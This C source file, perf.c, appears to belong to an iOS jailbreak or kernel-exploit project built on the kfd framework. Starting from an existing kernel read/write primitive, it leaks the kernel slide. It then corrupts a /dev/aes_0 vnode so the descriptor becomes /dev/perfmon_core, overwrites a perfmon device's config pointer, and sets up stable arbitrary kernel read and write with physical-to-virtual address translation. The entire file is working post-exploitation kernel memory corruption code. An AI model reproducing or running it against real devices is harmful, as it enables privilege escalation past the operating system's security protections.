//
//  perf.c
//  Bootstrap
//
//  Created by Chris Coding on 1/5/24.
//

#include <stdio.h>
#include "perf.h"

void perf_kread(struct kfd* kfd, uint64_t kaddr, void* uaddr, uint64_t size)
{
    assert((size != 0) && (size <= UINT16_MAX));
    assert(kfd->perf.shared_page.uaddr);
    assert(kfd->perf.shared_page.kaddr);

    volatile struct perfmon_config* config = (volatile struct perfmon_config*)(kfd->perf.shared_page.uaddr);
    *config = (volatile struct perfmon_config){};
    config->pc_spec.ps_events = (struct perfmon_event*)(kaddr);
    config->pc_spec.ps_event_count = (uint16_t)(size);

    struct perfmon_spec spec_buffer = {};
    spec_buffer.ps_events = (struct perfmon_event*)(uaddr);
    spec_buffer.ps_event_count = (uint16_t)(size);
    assert_bsd(ioctl(kfd->perf.dev.fd, PERFMON_CTL_SPECIFY, &spec_buffer));

    *config = (volatile struct perfmon_config){};
}

void perf_kwrite(struct kfd* kfd, void* uaddr, uint64_t kaddr, uint64_t size)
{
    assert((size != 0) && ((size % sizeof(uint64_t)) == 0));
    assert(kfd->perf.shared_page.uaddr);
    assert(kfd->perf.shared_page.kaddr);

    volatile struct perfmon_config* config = (volatile struct perfmon_config*)(kfd->perf.shared_page.uaddr);
    volatile struct perfmon_source* source = (volatile struct perfmon_source*)(kfd->perf.shared_page.uaddr + sizeof(*config));
    volatile struct perfmon_event* event = (volatile struct perfmon_event*)(kfd->perf.shared_page.uaddr + sizeof(*config) + sizeof(*source));

    uint64_t source_kaddr = kfd->perf.shared_page.kaddr + sizeof(*config);
    uint64_t event_kaddr = kfd->perf.shared_page.kaddr + sizeof(*config) + sizeof(*source);

    for (uint64_t i = 0; i < (size / sizeof(uint64_t)); i++) {
        *config = (volatile struct perfmon_config){};
        *source = (volatile struct perfmon_source){};
        *event = (volatile struct perfmon_event){};

        config->pc_source = (struct perfmon_source*)(source_kaddr);
        config->pc_spec.ps_events = (struct perfmon_event*)(event_kaddr);
        config->pc_counters = (struct perfmon_counter*)(kaddr + (i * sizeof(uint64_t)));

        source->ps_layout.pl_counter_count = 1;
        source->ps_layout.pl_fixed_offset = 1;

        struct perfmon_event event_buffer = {};
        uint64_t kvalue = ((volatile uint64_t*)(uaddr))[i];
        event_buffer.pe_number = kvalue;
        assert_bsd(ioctl(kfd->perf.dev.fd, PERFMON_CTL_ADD_EVENT, &event_buffer));
    }

    *config = (volatile struct perfmon_config){};
    *source = (volatile struct perfmon_source){};
    *event = (volatile struct perfmon_event){};
}

void perf_init(struct kfd* kfd)
{
    if (!kern_versions[kfd->info.env.vid].perf_supported) {
        return;
    }

    /*
     * Allocate a page that will be used as a shared buffer between user space and kernel space.
     */
    vm_address_t shared_page_address = 0;
    vm_size_t shared_page_size = pages(1);
    assert_mach(vm_allocate(mach_task_self(), &shared_page_address, shared_page_size, VM_FLAGS_ANYWHERE));
    memset((void*)(shared_page_address), 0, shared_page_size);
    kfd->perf.shared_page.uaddr = shared_page_address;
    kfd->perf.shared_page.size = shared_page_size;

    /*
     * Open a "/dev/aes_0" descriptor, then use it to find the kernel slide.
     */
    kfd->perf.dev.fd = open("/dev/aes_0", O_RDWR);
    assert(kfd->perf.dev.fd > 0);
}

void perf_run(struct kfd* kfd)
{
    if (!kern_versions[kfd->info.env.vid].perf_supported) {
        return;
    }

    assert(kfd->info.kaddr.current_proc);
    uint64_t fd_ofiles = dynamic_kget(proc__p_fd__fd_ofiles, kfd->info.kaddr.current_proc);
    uint64_t fileproc_kaddr = UNSIGN_PTR(fd_ofiles) + (kfd->perf.dev.fd * sizeof(uint64_t));
    uint64_t fileproc = 0;
    kread((uint64_t)(kfd), fileproc_kaddr, &fileproc, sizeof(fileproc));
    uint64_t fp_glob_kaddr = fileproc + offsetof(struct fileproc, fp_glob);
    uint64_t fp_glob = 0;
    kread((uint64_t)(kfd), fp_glob_kaddr, &fp_glob, sizeof(fp_glob));
    uint64_t fg_ops = static_kget(struct fileglob, fg_ops, UNSIGN_PTR(fp_glob));
    uint64_t fo_kqfilter =  static_kget(struct fileops, fo_kqfilter, UNSIGN_PTR(fg_ops));
    uint64_t vn_kqfilter = UNSIGN_PTR(fo_kqfilter);
    uint64_t kernel_slide = vn_kqfilter - dynamic_info(kernelcache__vn_kqfilter);
    uint64_t kernel_base = ARM64_LINK_ADDR + kernel_slide;
    kfd->perf.kernel_slide = kernel_slide;
    print_x64(kfd->perf.kernel_slide);

    if (kfd->kread.krkw_method_ops.kread == kread_sem_open_kread) {
        uint32_t mh_header[2] = {};
        mh_header[0] = kread_sem_open_kread_u32(kfd, kernel_base);
        mh_header[1] = kread_sem_open_kread_u32(kfd, kernel_base + 4);
        assert(mh_header[0] == 0xfeedfacf);
        assert(mh_header[1] == 0x0100000c);
    }

    /*
     * Corrupt the "/dev/aes_0" descriptor into a "/dev/perfmon_core" descriptor.
     */
    uint64_t fg_data = static_kget(struct fileglob, fg_data, UNSIGN_PTR(fp_glob));
    uint64_t v_specinfo = static_kget(struct vnode, v_un.vu_specinfo, UNSIGN_PTR(fg_data));
    kfd->perf.dev.si_rdev_kaddr = UNSIGN_PTR(v_specinfo) + offsetof(struct specinfo, si_rdev);
    kread((uint64_t)(kfd), kfd->perf.dev.si_rdev_kaddr, &kfd->perf.dev.si_rdev_buffer, sizeof(kfd->perf.dev.si_rdev_buffer));

    uint64_t cdevsw_kaddr = dynamic_info(kernelcache__cdevsw) + kernel_slide;
    uint64_t perfmon_dev_open_kaddr = dynamic_info(kernelcache__perfmon_dev_open) + kernel_slide;
    uint64_t cdevsw[14] = {};
    uint32_t dev_new_major = 0;
    for (uint64_t dmaj = 0; dmaj < 64; dmaj++) {
        uint64_t kaddr = cdevsw_kaddr + (dmaj * sizeof(cdevsw));
        kread((uint64_t)(kfd), kaddr, &cdevsw, sizeof(cdevsw));
        uint64_t d_open = UNSIGN_PTR(cdevsw[0]);
        if (d_open == perfmon_dev_open_kaddr) {
            dev_new_major = (dmaj << 24);
            break;
        }
    }

    uint32_t new_si_rdev_buffer[2] = {};
    new_si_rdev_buffer[0] = dev_new_major;
    new_si_rdev_buffer[1] = kfd->perf.dev.si_rdev_buffer[1] + 1;
    kwrite((uint64_t)(kfd), &new_si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(new_si_rdev_buffer));

    /*
     * Find ptov_table, gVirtBase, gPhysBase, gPhysSize, TTBR0 and TTBR1.
     */
    uint64_t ptov_table_kaddr = dynamic_info(kernelcache__ptov_table) + kernel_slide;
    kread((uint64_t)(kfd), ptov_table_kaddr, &kfd->perf.ptov_table, sizeof(kfd->perf.ptov_table));

    uint64_t gVirtBase_kaddr = dynamic_info(kernelcache__gVirtBase) + kernel_slide;
    kread((uint64_t)(kfd), gVirtBase_kaddr, &kfd->perf.gVirtBase, sizeof(kfd->perf.gVirtBase));
    print_x64(kfd->perf.gVirtBase);

    uint64_t gPhysBase_kaddr = dynamic_info(kernelcache__gPhysBase) + kernel_slide;
    kread((uint64_t)(kfd), gPhysBase_kaddr, &kfd->perf.gPhysBase, sizeof(kfd->perf.gPhysBase));
    print_x64(kfd->perf.gPhysBase);

    uint64_t gPhysSize_kaddr = dynamic_info(kernelcache__gPhysSize) + kernel_slide;
    kread((uint64_t)(kfd), gPhysSize_kaddr, &kfd->perf.gPhysSize, sizeof(kfd->perf.gPhysSize));
    print_x64(kfd->perf.gPhysSize);

    assert(kfd->info.kaddr.current_pmap);
    kfd->perf.ttbr[0].va = static_kget(struct pmap, tte, kfd->info.kaddr.current_pmap);
    kfd->perf.ttbr[0].pa = static_kget(struct pmap, ttep, kfd->info.kaddr.current_pmap);
    assert(phystokv(kfd, kfd->perf.ttbr[0].pa) == kfd->perf.ttbr[0].va);

    assert(kfd->info.kaddr.kernel_pmap);
    kfd->perf.ttbr[1].va = static_kget(struct pmap, tte, kfd->info.kaddr.kernel_pmap);
    kfd->perf.ttbr[1].pa = static_kget(struct pmap, ttep, kfd->info.kaddr.kernel_pmap);
    assert(phystokv(kfd, kfd->perf.ttbr[1].pa) == kfd->perf.ttbr[1].va);

    /*
     * Find the shared page in kernel space.
     */
    kfd->perf.shared_page.paddr = vtophys(kfd, kfd->perf.shared_page.uaddr);
    kfd->perf.shared_page.kaddr = phystokv(kfd, kfd->perf.shared_page.paddr);

    /*
     * Set up the perfmon device use for the master kread and kwrite:
     * - perfmon_devices[0][0].pmdv_config = kfd->perf.shared_page.kaddr
     * - perfmon_devices[0][0].pmdv_allocated = true
     */
    struct perfmon_device perfmon_device = {};
    uint64_t perfmon_device_kaddr = dynamic_info(kernelcache__perfmon_devices) + kernel_slide;
    uint8_t* perfmon_device_uaddr = (uint8_t*)(&perfmon_device);
    kread((uint64_t)(kfd), perfmon_device_kaddr, &perfmon_device, sizeof(perfmon_device));

    perfmon_device.pmdv_mutex[1] = (-1);
    perfmon_device.pmdv_config = (struct perfmon_config*)(kfd->perf.shared_page.kaddr);
    perfmon_device.pmdv_allocated = true;

    kwrite((uint64_t)(kfd), perfmon_device_uaddr + 12, perfmon_device_kaddr + 12, sizeof(uint64_t));
    ((volatile uint32_t*)(perfmon_device_uaddr))[4] = 0;
    kwrite((uint64_t)(kfd), perfmon_device_uaddr + 16, perfmon_device_kaddr + 16, sizeof(uint64_t));
    ((volatile uint32_t*)(perfmon_device_uaddr))[5] = 0;
    kwrite((uint64_t)(kfd), perfmon_device_uaddr + 20, perfmon_device_kaddr + 20, sizeof(uint64_t));
    kwrite((uint64_t)(kfd), perfmon_device_uaddr + 24, perfmon_device_kaddr + 24, sizeof(uint64_t));
    kwrite((uint64_t)(kfd), perfmon_device_uaddr + 28, perfmon_device_kaddr + 28, sizeof(uint64_t));

    kfd->perf.saved_kread = kfd->kread.krkw_method_ops.kread;
    kfd->perf.saved_kwrite = kfd->kwrite.krkw_method_ops.kwrite;
    kfd->kread.krkw_method_ops.kread = perf_kread;
    kfd->kwrite.krkw_method_ops.kwrite = perf_kwrite;
}

void perf_free(struct kfd* kfd)
{
    if (!kern_versions[kfd->info.env.vid].perf_supported) {
        return;
    }

    kfd->kread.krkw_method_ops.kread = kfd->perf.saved_kread;
    kfd->kwrite.krkw_method_ops.kwrite = kfd->perf.saved_kwrite;

    /*
     * Restore the "/dev/perfmon_core" descriptor back to the "/dev/aes_0" descriptor.
     * Then, close it and deallocate the shared page.
     * This leaves the first perfmon device "pmdv_allocated", which is fine.
     */
    kwrite((uint64_t)(kfd), &kfd->perf.dev.si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(kfd->perf.dev.si_rdev_buffer));
    assert_bsd(close(kfd->perf.dev.fd));
    assert_mach(vm_deallocate(mach_task_self(), kfd->perf.shared_page.uaddr, kfd->perf.shared_page.size));
}

uint64_t phystokv(struct kfd* kfd, uint64_t pa)
{
    const uint64_t PTOV_TABLE_SIZE = 8;
    const uint64_t gVirtBase = kfd->perf.gVirtBase;
    const uint64_t gPhysBase = kfd->perf.gPhysBase;
    const uint64_t gPhysSize = kfd->perf.gPhysSize;
    const struct ptov_table_entry* ptov_table = &kfd->perf.ptov_table[0];

    for (uint64_t i = 0; (i < PTOV_TABLE_SIZE) && (ptov_table[i].len != 0); i++) {
        if ((pa >= ptov_table[i].pa) && (pa < (ptov_table[i].pa + ptov_table[i].len))) {
            return pa - ptov_table[i].pa + ptov_table[i].va;
        }
    }

    assert(!((pa < gPhysBase) || ((pa - gPhysBase) >= gPhysSize)));
    return pa - gPhysBase + gVirtBase;
}

uint64_t vtophys(struct kfd* kfd, uint64_t va)
{
    const uint64_t ROOT_LEVEL = PMAP_TT_L1_LEVEL;
    const uint64_t LEAF_LEVEL = PMAP_TT_L3_LEVEL;

    uint64_t pa = 0;
    uint64_t tt_kaddr = (va >> 63) ? kfd->perf.ttbr[1].va : kfd->perf.ttbr[0].va;

    for (uint64_t cur_level = ROOT_LEVEL; cur_level <= LEAF_LEVEL; cur_level++) {
        uint64_t offmask, shift, index_mask, valid_mask, type_mask, type_block;
        switch (cur_level) {
            case PMAP_TT_L0_LEVEL: {
                offmask = ARM_16K_TT_L0_OFFMASK;
                shift = ARM_16K_TT_L0_SHIFT;
                index_mask = ARM_16K_TT_L0_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L1_LEVEL: {
                offmask = ARM_16K_TT_L1_OFFMASK;
                shift = ARM_16K_TT_L1_SHIFT;
                index_mask = ARM_16K_TT_L1_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L2_LEVEL: {
                offmask = ARM_16K_TT_L2_OFFMASK;
                shift = ARM_16K_TT_L2_SHIFT;
                index_mask = ARM_16K_TT_L2_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L3_LEVEL: {
                offmask = ARM_16K_TT_L3_OFFMASK;
                shift = ARM_16K_TT_L3_SHIFT;
                index_mask = ARM_16K_TT_L3_INDEX_MASK;
                valid_mask = ARM_PTE_TYPE_VALID;
                type_mask = ARM_PTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_L3BLOCK;
                break;
            }
            default: {
                assert_false("bad pmap tt level");
                return 0;
            }
        }

        uint64_t tte_index = (va & index_mask) >> shift;
        uint64_t tte_kaddr = tt_kaddr + (tte_index * sizeof(uint64_t));
        uint64_t tte = 0;
        kread((uint64_t)(kfd), tte_kaddr, &tte, sizeof(tte));

        if ((tte & valid_mask) != valid_mask) {
            return 0;
        }

        if ((tte & type_mask) == type_block) {
            pa = ((tte & ARM_TTE_PA_MASK & ~offmask) | (va & offmask));
            break;
        }

        tt_kaddr = phystokv(kfd, tte & ARM_TTE_TABLE_MASK);
    }

    return pa;
}

